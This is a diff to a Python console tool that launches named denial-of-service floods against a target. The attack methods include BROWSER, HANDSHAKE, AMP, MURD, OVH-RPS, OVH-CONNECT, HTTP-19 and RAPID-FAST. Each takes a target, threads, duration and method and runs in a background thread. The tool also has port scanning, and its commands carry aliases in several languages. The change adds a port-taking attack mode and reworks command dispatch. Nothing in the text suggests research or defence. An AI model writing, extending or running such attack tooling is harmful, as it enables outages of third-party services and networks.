@@ -41,18 +41,22 @@ def handle_attack_command(com, languages, attack_type,mode,more=''):
         print(b % (com[0]))
     else:
         c = 0
+        if more != '':attack_type = more.replace('-','_')
+        else:attack_type = attack_type.replace('-','_')
         if mode == 1:
            if len(com) == 6:target,thread,times,meths,p = com[1], com[2], com[3],com[4], com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {meths} {p} command.txt')).start(); print(atk % (languages['DISPLAY']['ATTACK'], target, com[0])); c = 1
         elif mode == 2:
            if len(com) == 5:target,thread,times,meths = com[1], com[2], com[3],com[4]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {meths}')).start(); print(atk % (languages['DISPLAY']['ATTACK'], target, com[0])); c = 1
+        elif mode == 5:
+           if len(com) == 6:target,port,thread,times,meths = com[1],com[2], com[3], com[4],com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {meths}')).start(); print(atk % (languages['DISPLAY']['ATTACK'], target, com[0])); c = 1
         elif mode == 4:
-           if len(com) == 6:
-            target,thread,times,booters,meths = com[1], com[2], com[3],com[4],com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {booters} {meths}')).start(); a = languages['DISPLAY']['ATTACK'];  print(atk % (a, target, com[0])); c = 1
-        elif mode == 3:target,thread,meths = com[1], com[2], com[3]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {meths}')).start(); print(atk % (languages['DISPLAY']['ATTACK'], target, com[0])); c = 1
+           if len(com) == 7:
+            target,port,thread,times,booters,meths = com[1],com[2], com[3], com[4],com[5],com[6]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {booters} {meths}')).start(); a = languages['DISPLAY']['ATTACK'];  print(atk % (a, target, com[0])); c = 1
+        elif mode == 3:
+           if len(com) == 4:target,thread,meths = com[1], com[2], com[3]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {meths}')).start(); print(atk % (languages['DISPLAY']['ATTACK'], target, com[0])); c = 1
         if c == 0:
-           a = format_banner(languages['METHODS'][attack_type])
-           if more != '':a = a.replace('HTTP-19',F'HTTP-{more}')
-           print(a)
+           a = format_banner(languages['METHODS'][attack_type.replace('-','').replace('_','')])
+           if more != '':a = a.replace(attack_type,F'{more}')
 
 def controler():
     global port_live,port_on,port_keep,c,methods,q
@@ -76,15 +80,16 @@ def controler():
         elif a == 'CLS':clear_console()
         elif a in ['METH','ATTACKS','ATK','HUB','METHOD','METHODS']:print(methods())
         elif a in ['BROWSER','المتصفح','เบราว์เซอร์'] or a.encode() == b'TR\xc3\x8cNHDUY\xe1\xbb\x86T':handle_attack_command(com, languages, 'BROWSER',1)
-        elif a in ['HANDSHAKE','المصافحة','เชื่อมต่อ'] or a.encode() == b'B\xe1\xba\xaeTTAY':handle_attack_command(com, languages, 'HANDSHAK',2)
-        elif a in ['HANDSHAKE2','المصافحة2','เชื่อมต่อ2'] or a.encode() == b'B\xe1\xba\xaeTTAY2':handle_attack_command(com, languages, 'HANDSHAKE2',2)
+        elif a in ['HANDSHAKE','المصافحة','เชื่อมต่อ'] or a.encode() in [b'B\xe1\xba\xaeTTAY',b'B\xe1\xba\xaeTTAY2']:handle_attack_command(com, languages, 'HANDSHAKE',2)
+        elif a in ['HANDSHAKE2','المصافحة2','เชื่อมต่อ2'] or a.encode() == b'B\xe1\xba\xaeTTAY2':handle_attack_command(com, languages, 'HANDSHAKE',2,'HANDSHAKE2')
+        elif a == 'RAPID-FAST':handle_attack_command(com, languages, 'MURD',3,'RAPID-FAST')
         elif a in ['AMP','أمب','ขยาย']:handle_attack_command(com, languages, 'AMP',2)
         elif a == 'MURD':handle_attack_command(com, languages, 'MURD',3)
-        elif a in ['MURD-OPT','MURD_OPT','MURDOPT']:handle_attack_command(com, languages, 'MURDOPT',3)
-        elif a in ['OVH_RPS','OVH-RPS','أوفه-آربيس','OVHRPS']:handle_attack_command(com+' NULL', languages, 'OVHRPS',4)
-        elif a in ['OVH-CONNECT','OVH-الاتصال','OVH_CONNECT','OVHCONNECT']:handle_attack_command(com+' NULL', languages, 'OVHCONNECT',4)
-        elif a in ['HTTPQUERY','HTTP_QUERY','HTTP-QUERY']:handle_attack_command(com, languages, 'HTTPQUERY',4)
-        elif a in ['HTTP_19','HTTP-19'] or a in ['HTTP_11','HTTP-11']:handle_attack_command(com, languages, a.replace('_','').replace('-','').replace('11','19'),2,a.replace('_','').replace('-','').replace('HTTP',''))
+        elif a in ['MURD-OPT','MURD_OPT','MURDOPT']:handle_attack_command(com, languages, 'MURD',3,'MURD-OPT')
+        elif a in ['OVH_RPS','OVH-RPS','أوفه-آربيس','OVHRPS']:handle_attack_command(com+' NULL', languages, 'OVH-RPS',4)
+        elif a in ['OVH-CONNECT','OVH-الاتصال','OVH_CONNECT','OVHCONNECT']:handle_attack_command(com+' NULL', languages, 'OVH-CONNECT',4)
+        elif a in ['HTTPQUERY','HTTP_QUERY','HTTP-QUERY']:handle_attack_command(com, languages, 'HTTP-QUERY',4)
+        elif a in ['HTTP_19','HTTP-19']:handle_attack_command(com, languages, 'HTTP-19',5)
         elif a == 'PAPING':
            if len(com) == 5:
               ip = com[1]
@@ -104,7 +109,7 @@ def controler():
               print('\x1b[38;5;112mPAPING \x1b[38;5;76m<\x1b[38;5;78mIP OR HOSTNAME\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;106mPORT\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;196mTCP OR UDP only\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;78mtimeout\x1b[38;5;76m>\x1b[0m')
         elif a == 'SCAN':
            if len(com) == 4:
-              ip,protocol, many = com[1], com[2], int(com[3])
+              ip = com[1]; protocol = com[2]; many = int(com[3])
               port_live = 0; port_on = 0; port_keep.clear()
               t = threading.Thread(target=checked_protocol,args=(ip, protocol, many)); t.start()
               while True:
